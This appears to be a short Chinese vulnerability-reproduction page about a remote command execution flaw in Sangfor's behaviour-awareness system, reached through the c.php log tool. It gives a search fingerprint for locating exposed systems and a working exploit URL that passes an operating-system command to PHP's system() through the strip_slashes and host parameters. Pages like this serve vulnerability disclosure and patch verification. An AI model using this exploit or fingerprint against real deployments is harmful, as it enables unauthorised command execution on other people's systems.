# 深信服 行为感知系统 c.php 远程命令执行漏洞

## 漏洞描述

深信服 行为感知系统  c.php  远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行

## 漏洞影响

<a-checkbox checked>深信服 行为感知系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="isHighPerformance : !!SFIsHighPerformance,"</a-checkbox></br>

## 漏洞复现

登录页面如下

![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131051237.png)

访问漏洞Url

```plain
/tool/log/c.php?strip_slashes=system&host=ipconfig
```

![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131051173.png)